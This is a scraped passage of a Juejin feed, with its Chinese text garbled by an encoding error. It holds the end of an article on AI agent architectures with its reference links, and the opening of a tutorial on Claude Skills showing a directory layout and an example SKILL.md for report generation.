<li>åœ¨è¡¨ç¤ºå±‚é¢ï¼Œå®ƒå°†æ‰€æœ‰å†³ç­–ç»Ÿä¸€ä¸º Python å‡½æ•°è°ƒç”¨ï¼šåŸå­è¡ŒåŠ¨è¢«å°è£…ä¸ºç¯å¢ƒå¯è¯†åˆ«çš„ç¡®å®šå‡½æ•°è°ƒç”¨ï¼Œä½œä¸ºå†³ç­–æ ‘çš„å¶å­èŠ‚ç‚¹å¯ç›´æ¥æ‰§è¡Œï¼›è§„åˆ’åˆ™è¡¨ç°ä¸ºæ™ºèƒ½ä½“è‡ªä¸»å‘½åçš„å ä½ç¬¦å‡½æ•°ï¼Œä½œä¸ºéå¶å­èŠ‚ç‚¹ä»£è¡¨éœ€è¿›ä¸€æ­¥åˆ†è§£çš„å­ç›®æ ‡ï¼Œä½¿ä»é¡¶å±‚è§„åˆ’åˆ°åº•å±‚è¡ŒåŠ¨éƒ½çº³å…¥åŒä¸€ä»£ç è¡¨ç¤ºä½“ç³»ã€‚</li>
<li>åœ¨æœºåˆ¶å±‚é¢ï¼ŒReCode é‡‡ç”¨å•ä¸€çš„é€’å½’å¼ä»£ç ç”Ÿæˆæœºåˆ¶ï¼Œæ™ºèƒ½ä½“æ— éœ€åˆ‡æ¢æ¨¡å¼ï¼Œåªéœ€æŒ‰éœ€åŠ¨æ€å±•å¼€å½“å‰å ä½ç¬¦å‡½æ•°ã€‚è¿™ç§æ–¹å¼è®©æ™ºèƒ½ä½“èƒ½ä¾æ®å®æ—¶ç¯å¢ƒåé¦ˆçµæ´»è°ƒæ•´å†³ç­–è·¯å¾„ï¼Œæœ€ç»ˆè·å¾—è‡ªé€‚åº”æ§åˆ¶å†³ç­–ç²’åº¦çš„èƒ½åŠ›ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cf14b03c74f4fe4acb108da1982a692~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606911&amp;x-signature=Jr5XwtIIWBFeFM2uYmql5lGm7go%3D" alt="Recode" loading="lazy"/></p>
<p>Recode</p>
<h3 data-id="heading-26">0xFF å‚è€ƒ</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.all-hands.dev%2Fopenhands%2Fusage%2Farchitecture%2Fbackend" target="_blank" title="https://docs.all-hands.dev/openhands/usage/architecture/backend" ref="nofollow noopener noreferrer">docs.all-hands.dev/openhands/uâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1936485868761257658" target="_blank" title="https://zhuanlan.zhihu.com/p/1936485868761257658" ref="nofollow noopener noreferrer">å½“AI Agentä»â€œç©å…·â€èµ°å‘â€œå·¥å…·â€ï¼Œæˆ‘ä»¬è¯¥å…³æ³¨ä»€ä¹ˆï¼ŸOpenhandsæ¶æ„è§£æã€ç¬¬äºŒç¯‡ï¼šAgent ç›¸å…³æ ¸å¿ƒæ¦‚å¿µã€‘</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fdreamrenderx" target="_blank" title="https://www.zhihu.com/people/dreamrenderx" ref="nofollow noopener noreferrer">å…‹é‡Œ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1936175201323825087" target="_blank" title="https://zhuanlan.zhihu.com/p/1936175201323825087" ref="nofollow noopener noreferrer">å½“AI Agentä»â€œç©å…·â€èµ°å‘â€œå·¥å…·â€ï¼Œæˆ‘ä»¬è¯¥å…³æ³¨ä»€ä¹ˆï¼ŸOpenhandsæ¶æ„è§£æã€ç¬¬ä¸€ç¯‡ï¼šç³»åˆ—å¯¼è¯»ã€‘</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fdreamrenderx" target="_blank" title="https://www.zhihu.com/people/dreamrenderx" ref="nofollow noopener noreferrer">å…‹é‡Œ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1940436682949244630" target="_blank" title="https://zhuanlan.zhihu.com/p/1940436682949244630" ref="nofollow noopener noreferrer">Coding Agentä¹‹Openhandsè§£æ(å«ä»£ç )</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fwu-long-ming-cha-56" target="_blank" title="https://www.zhihu.com/people/wu-long-ming-cha-56" ref="nofollow noopener noreferrer">Arrow</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1940824548485347192" target="_blank" title="https://zhuanlan.zhihu.com/p/1940824548485347192" ref="nofollow noopener noreferrer">OpenHands æºç è§£è¯»</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Fpeople%2Fxiao-hui-66-72" target="_blank" title="https://www.zhihu.com/people/xiao-hui-66-72" ref="nofollow noopener noreferrer">ä¸€åŠ›è¾‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1940767960567379110" target="_blank" title="https://zhuanlan.zhihu.com/p/1940767960567379110" ref="nofollow noopener noreferrer">åŸºäºå¤§æ¨¡å‹çš„é¢†åŸŸåœºæ™¯å¼€å‘ï¼šä»å•æ™ºèƒ½ä½“åˆ°å¤šæ™ºèƒ½ä½“çš„Reactæ¡†æ¶è®¾è®¡ä¸å®ç°</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhihu.com%2Forg%2Fa-li-ji-zhu" target="_blank" title="https://www.zhihu.com/org/a-li-ji-zhu" ref="nofollow noopener noreferrer">é˜¿é‡Œäº‘å¼€å‘è€…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzk0MjIwODQ2NA%3D%3D%26mid%3D2247485877%26idx%3D1%26sn%3D4c790289f2c6845cf905db4b05e05be5%26chksm%3Dc2c7ed0af5b0641ce8e4175a5f370279eacc6b6cd248831d50ca134d09dd8bfd31c4d0edafae%26cur_album_id%3D3486875757958348801%26scene%3D190%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzk0MjIwODQ2NA==&amp;mid=2247485877&amp;idx=1&amp;sn=4c790289f2c6845cf905db4b05e05be5&amp;chksm=c2c7ed0af5b0641ce8e4175a5f370279eacc6b6cd248831d50ca134d09dd8bfd31c4d0edafae&amp;cur_album_id=3486875757958348801&amp;scene=190#rd" ref="nofollow noopener noreferrer">æ·±å…¥å‰–æReActæ¡†æ¶ï¼šèåˆâ€œæ€è€ƒ-è¡ŒåŠ¨-è§‚å¯Ÿâ€çš„AI Agentå·¥ä½œåŸç†</a> AnthroTech AI</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1976585890047497116" target="_blank" title="https://zhuanlan.zhihu.com/p/1976585890047497116" ref="nofollow noopener noreferrer">å¹´ç»ˆæ€»ç»“ï¼š2025å¹´ AI äº§å“åŠæ¶æ„æ¼”è¿›æ·±åº¦ç ”ç©¶æŠ¥å‘Š</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzIzOTYyMTI1MA%3D%3D%26mid%3D2247483863%26idx%3D1%26sn%3D152ffdf5ca70244805c016e4b110ffa5%26chksm%3De8900d133821c3f96aac0eee3ca28adbb46d3aaa975acc731d46aa3f168390eced5d47de62e6%26mpshare%3D1%26scene%3D1%26srcid%3D1215PC2sBdclZw3Yok7oLctc%26sharer_shareinfo%3D3872ed9d65c7d497ff746d8942e0a393%26sharer_shareinfo_first%3D3872ed9d65c7d497ff746d8942e0a393%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzIzOTYyMTI1MA==&amp;mid=2247483863&amp;idx=1&amp;sn=152ffdf5ca70244805c016e4b110ffa5&amp;chksm=e8900d133821c3f96aac0eee3ca28adbb46d3aaa975acc731d46aa3f168390eced5d47de62e6&amp;mpshare=1&amp;scene=1&amp;srcid=1215PC2sBdclZw3Yok7oLctc&amp;sharer_shareinfo=3872ed9d65c7d497ff746d8942e0a393&amp;sharer_shareinfo_first=3872ed9d65c7d497ff746d8942e0a393#rd" ref="nofollow noopener noreferrer">Google Agent ç™½çš®ä¹¦è§£æ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg4MzYxODkzMg%3D%3D%26mid%3D2247505300%26idx%3D1%26sn%3D865e9c2d71fd5b54f3ca74c80da0f91c%26chksm%3Dceea3aad2e286b3f3922e6dd9de47bbdd4b2484edbf810d60c7f053d3ff06e4ab590219cb34f%26mpshare%3D1%26scene%3D1%26srcid%3D1215Smy2dt9QO2yLyvNTp9Lo%26sharer_shareinfo%3D2cf8f6acabb2a8bb207be9c4fa8e57d2%26sharer_shareinfo_first%3D2cf8f6acabb2a8bb207be9c4fa8e57d2%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODkzMg==&amp;mid=2247505300&amp;idx=1&amp;sn=865e9c2d71fd5b54f3ca74c80da0f91c&amp;chksm=ceea3aad2e286b3f3922e6dd9de47bbdd4b2484edbf810d60c7f053d3ff06e4ab590219cb34f&amp;mpshare=1&amp;scene=1&amp;srcid=1215Smy2dt9QO2yLyvNTp9Lo&amp;sharer_shareinfo=2cf8f6acabb2a8bb207be9c4fa8e57d2&amp;sharer_shareinfo_first=2cf8f6acabb2a8bb207be9c4fa8e57d2#rd" ref="nofollow noopener noreferrer">Promptã€Context engineering åˆå‘å‰è¿›åŒ–äº†ï¼Œ3ä¸ªå…³é”®ç»´åº¦+5ä¸ªå…·ä½“æ æ† ï½œè°·æ­Œ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering%2Fadvanced-tool-use" target="_blank" title="https://www.anthropic.com/engineering/advanced-tool-use" ref="nofollow noopener noreferrer">Introducing advanced tool use on the Claude Developer Platform</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg5OTU1NTEwMg%3D%3D%26mid%3D2247484450%26idx%3D1%26sn%3D4f1271dbd048b457327a5bf59e171e63%26chksm%3Dc18adfa1eb460f4c44722634a7c436a6e8c3b7a52b034c191fce8320d8998c272aacfccf9f91%26mpshare%3D1%26scene%3D1%26srcid%3D1218T1ddcT1cVBKYcydA1BO9%26sharer_shareinfo%3De2bffd9009dee67bdc3952e83a695b58%26sharer_shareinfo_first%3De2bffd9009dee67bdc3952e83a695b58%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg5OTU1NTEwMg==&amp;mid=2247484450&amp;idx=1&amp;sn=4f1271dbd048b457327a5bf59e171e63&amp;chksm=c18adfa1eb460f4c44722634a7c436a6e8c3b7a52b034c191fce8320d8998c272aacfccf9f91&amp;mpshare=1&amp;scene=1&amp;srcid=1218T1ddcT1cVBKYcydA1BO9&amp;sharer_shareinfo=e2bffd9009dee67bdc3952e83a695b58&amp;sharer_shareinfo_first=e2bffd9009dee67bdc3952e83a695b58#rd" ref="nofollow noopener noreferrer">ä»MCPåˆ°PTC Anthropicå›å½’Code Executionè·¯çº¿ï¼ŒAiPyçš„èŒƒå¼è¢«å†æ¬¡éªŒè¯</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fce101.mintlify.app%2Fcore-tech%2Fagent%237-2-5-multi-agent" target="_blank" title="https://ce101.mintlify.app/core-tech/agent#7-2-5-multi-agent" ref="nofollow noopener noreferrer">ce101.mintlify.app/core-tech/aâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg5OTU1NTEwMg%3D%3D%26mid%3D2247484380%26idx%3D1%26sn%3Dcd6f91d7432b3392cc79c81f5187d467%26scene%3D21%26poc_token%3DHGUURWmjf26vXwXyhVyjEKDx566X_Bw32JPxlBJU" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg5OTU1NTEwMg==&amp;mid=2247484380&amp;idx=1&amp;sn=cd6f91d7432b3392cc79c81f5187d467&amp;scene=21&amp;poc_token=HGUURWmjf26vXwXyhVyjEKDx566X_Bw32JPxlBJU" ref="nofollow noopener noreferrer">AI AgentçœŸæ­£è½åœ°çš„å…³é”®ï¼šå¤§æ¨¡å‹ä¸ç¯å¢ƒæ•°æ®çš„æ— é™æ‰©å±•èƒ½åŠ›</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1983512173549483912" target="_blank" title="https://zhuanlan.zhihu.com/p/1983512173549483912" ref="nofollow noopener noreferrer">Agent å…ƒå¹´å¤ç›˜ï¼šä» Claude Code åˆ° Deep Agentï¼ŒAgent çš„æ¶æ„ä¹‹äº‰å·²ç»ç»“æŸ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzA3MjU5NTcwNw%3D%3D%26mid%3D2247485567%26idx%3D1%26sn%3Ded61c27f310749ac7674d2ac0f40deaf%26chksm%3D9e5732b6c266e897a509b607a71ed9dc4f0bb857049be8720de034e85d690ee14077a47fdd84%26mpshare%3D1%26scene%3D1%26srcid%3D010966Ch8enqeK3jVsEbcU6u%26sharer_shareinfo%3D39bc3e2ecefb7fbab4df0718aa92d607%26sharer_shareinfo_first%3D39bc3e2ecefb7fbab4df0718aa92d607%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzA3MjU5NTcwNw==&amp;mid=2247485567&amp;idx=1&amp;sn=ed61c27f310749ac7674d2ac0f40deaf&amp;chksm=9e5732b6c266e897a509b607a71ed9dc4f0bb857049be8720de034e85d690ee14077a47fdd84&amp;mpshare=1&amp;scene=1&amp;srcid=010966Ch8enqeK3jVsEbcU6u&amp;sharer_shareinfo=39bc3e2ecefb7fbab4df0718aa92d607&amp;sharer_shareinfo_first=39bc3e2ecefb7fbab4df0718aa92d607#rd" ref="nofollow noopener noreferrer">AI çš„â€œæ‰“å·¥äººâ€æ—¶ä»£ï¼šæ·±åº¦æ‹†è§£ Claude Agent SDKï¼Œè®©ä½ çš„æ™ºèƒ½ä½“çœŸæ­£â€œæ´»â€èµ·æ¥</a></p>
<p>æœ¬æ–‡ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarkdown.com.cn" target="_blank" title="https://markdown.com.cn" ref="nofollow noopener noreferrer">markdown.com.cn</a> æ’ç‰ˆ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡å¸¦ä½ ä¸Šæ‰‹ Skillsï¼šæ„å»ºå¯å¤ç”¨çš„ AI èƒ½åŠ›ä½“ç³»]]></title>    <link>https://juejin.cn/post/7597653098563895350</link>    <guid>https://juejin.cn/post/7597653098563895350</guid>    <pubDate>2026-01-21T13:29:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597653098563895350" data-draft-id="7597693638923026495" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡å¸¦ä½ ä¸Šæ‰‹ Skillsï¼šæ„å»ºå¯å¤ç”¨çš„ AI èƒ½åŠ›ä½“ç³»"/> <meta itemprop="keywords" content="Claude,AIGC"/> <meta itemprop="datePublished" content="2026-01-21T13:29:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥‡èˆç²¾é€‰"/> <meta itemprop="url" content="https://juejin.cn/user/4388906147515367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡å¸¦ä½ ä¸Šæ‰‹ Skillsï¼šæ„å»ºå¯å¤ç”¨çš„ AI èƒ½åŠ›ä½“ç³»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4388906147515367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥‡èˆç²¾é€‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T13:29:50.000Z" title="Wed Jan 21 2026 13:29:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ ‡å‡†åŒ–ã€å¯å¤ç”¨ã€æ¸è¿›å¼â€”â€”è®© AI é«˜æ•ˆå®Œæˆé‡å¤æ€§ä»»åŠ¡</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€ ä¸ºä»€ä¹ˆéœ€è¦ Skills</h2>
<p>åœ¨ä¼ ç»Ÿ LLM ä½¿ç”¨åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¾èµ– Prompt æ¥è®©æ¨¡å‹å®Œæˆä»»åŠ¡ï¼Œä¾‹å¦‚ï¼š</p>
<blockquote>
<p>"ä½ æ˜¯ä¸€ä¸ªé¡¹ç›®ç»ç†ï¼Œè¯·æ ¹æ®è¾“å…¥å†…å®¹ç”Ÿæˆç¬¦åˆå…¬å¸è§„èŒƒçš„å‘¨æŠ¥â€¦â€¦"</p>
</blockquote>
<p>è¿™ç§æ–¹å¼å­˜åœ¨ä¸‰ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š</p>
<ol>
<li>
<p><strong>ä¸ç¨³å®š</strong>ï¼šæ¨¡å‹å¯¹åŒä¸€ä¸ª Prompt çš„ç†è§£å¯èƒ½ä¸åŒï¼Œè¾“å‡ºç»“æœä¸ä¸€è‡´ã€‚</p>
</li>
<li>
<p><strong>ä¸å¯å¤ç”¨</strong>ï¼šæ¯æ¬¡éƒ½è¦é‡æ–°ç¼–å†™ Promptï¼Œæ•ˆç‡ä½ã€‚</p>
</li>
<li>
<p><strong>ä¸å¯ç»„åˆ</strong>ï¼šéš¾ä»¥å°†å¤šä¸ªä»»åŠ¡æ•´åˆæˆå¤æ‚å·¥ä½œæµã€‚</p>
</li>
</ol>
<p>Claude Skills æä¾›äº†è§£å†³æ–¹æ¡ˆï¼š</p>
<blockquote>
<p><strong>Skills = å¯å¤ç”¨çš„ã€ç»“æ„åŒ–çš„ Prompt + æ‰§è¡Œè§„åˆ™ + èµ„æº</strong></p>
</blockquote>
<p>å®ƒå°†â€œå¦‚ä½•åšä¸€ä»¶äº‹â€å°è£…æˆ Claude å¯é•¿æœŸè®°ä½å’Œè°ƒç”¨çš„èƒ½åŠ›æ¨¡å—ï¼Œè®© AI çš„æ‰§è¡Œæ›´æ ‡å‡†ã€ç¨³å®šã€å¯ç»„åˆã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ä»€ä¹ˆæ˜¯ Skills</h2>
<p><strong>Skills</strong> æ˜¯ Claude çš„å¯å¤ç”¨èƒ½åŠ›åŒ…ï¼Œç”¨äºå°†<strong>é¢†åŸŸçŸ¥è¯†ã€æœ€ä½³å®è·µã€å·¥ä½œæµç¨‹å’Œæ‰§è¡Œé€»è¾‘</strong>å°è£…ï¼Œä½¿ Claude é«˜è´¨é‡ã€ç¨³å®šåœ°å®Œæˆä»»åŠ¡ã€‚</p>
<h3 data-id="heading-2">1. åŸºæœ¬ç›®å½•ç»“æ„</h3>
<p>ä¸€ä¸ªæ ‡å‡†çš„ Skill é¡¹ç›®ï¼Œç›®å½•ç»“æ„æ¸…æ™°ä¸”è½»é‡åŒ–ï¼Œæ ¸å¿ƒæ–‡ä»¶ä»…1ä¸ªï¼Œå…¶ä»–å‡ä¸ºå¯é€‰è¡¥å……ï¼š</p>
<pre><code class="hljs language-text" lang="text">
my-skill/

â”œâ”€â”€ SKILL.md # å¿…éœ€ï¼šå…ƒæ•°æ® + æ‰§è¡ŒæŒ‡ä»¤

â”œâ”€â”€ scripts/ # å¯é€‰ï¼šå¯æ‰§è¡Œè„šæœ¬

â”œâ”€â”€ templates/ # å¯é€‰ï¼šæ¨¡æ¿æ–‡ä»¶

â””â”€â”€ resources/ # å¯é€‰ï¼šå…¶ä»–èµ„æºæ–‡ä»¶

</code></pre>
<h3 data-id="heading-3">2. æ ¸å¿ƒæ–‡ä»¶ SKILL.md ç¤ºä¾‹</h3>
<pre><code class="hljs language-markdown" lang="markdown">
---

name: report-automation

description: æ ¹æ®è¾“å…¥ç”Ÿæˆæ—¥æŠ¥/å‘¨æŠ¥/æœˆæŠ¥ï¼Œå¹¶æŒ‰æ¨¡æ¿è¾“å‡º Markdownã€‚

---

  

<span class="hljs-section">##  æŒ‡ä»¤</span>

<span class="hljs-bullet">1.</span> æå–å²—ä½ã€æŠ¥å‘Šç±»å‹ã€å§“åã€æ—¥æœŸå’Œå·¥ä½œå†…å®¹

<span class="hljs-bullet">2.</span> é€‰æ‹©å¯¹åº”æ¨¡æ¿

<span class="hljs-bullet">3.</span> ç”Ÿæˆç»“æ„åŒ– Markdown æŠ¥å‘Š

</code></pre>
<p>è¿™é‡Œè¦æ³¨æ„ï¼š</p>
<ul>
<li>
<p>å¤´éƒ¨çš„ name å’Œ description æ˜¯å…ƒæ•°æ®ï¼Œä¸»è¦ç”¨äº Claude å¿«é€ŸåŒ¹é…â€”â€”å½“ä½ è¾“å…¥éœ€æ±‚æ—¶ï¼ŒClaude ä¼šæ ¹æ®è¿™ä¸¤ä¸ªå­—æ®µåˆ¤æ–­æ˜¯å¦éœ€è¦è°ƒç”¨è¯¥ Skillï¼›</p>
</li>
<li>
<p>ä¸‹æ–¹çš„â€œæ‰§è¡ŒæŒ‡ä»¤â€æ˜¯æ ¸å¿ƒï¼Œå¿…é¡»æ¸…æ™°ã€å¯è½åœ°ï¼Œç›¸å½“äºç»™ Claude å†™çš„â€œæ“ä½œæ‰‹å†Œâ€ï¼Œé¿å…æ‰§è¡Œåå·®ã€‚</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€Skills çš„ã€Œæ¸è¿›å¼æ¶æ„ã€</h2>
<p>å½“æˆ‘ä»¬éœ€è¦åŒæ—¶ç”¨åˆ°å¤šä¸ªSkillï¼ˆæ¯”å¦‚å‘¨æŠ¥ç”Ÿæˆã€éœ€æ±‚åˆ†æã€æ–‡æ¡£æ ¡éªŒï¼‰æ—¶ï¼Œç›´æ¥å…¨é‡åŠ è½½æ‰€æœ‰Skillä¼šé‡åˆ°ä¸‰ä¸ªæ ¸å¿ƒé—®é¢˜ï¼Œè¿™ä¹Ÿæ˜¯æ¸è¿›å¼æ¶æ„è¦è§£å†³çš„æ ¸å¿ƒç—›ç‚¹ï¼š</p>
<ul>
<li>
<p><strong>Tokenæ¶ˆè€—æš´æ¶¨</strong>ï¼šæ¯ä¸ªSkillåŒ…å«çš„è„šæœ¬ã€æ¨¡æ¿ç­‰éƒ½æ˜¯æ–‡æœ¬å†…å®¹ï¼Œå…¨é‡åŠ è½½ä¼šè®©å•æ¬¡è°ƒç”¨çš„Tokené‡å¤§å¹…å¢åŠ ï¼Œç›´æ¥æå‡ä½¿ç”¨æˆæœ¬ï¼›</p>
</li>
<li>
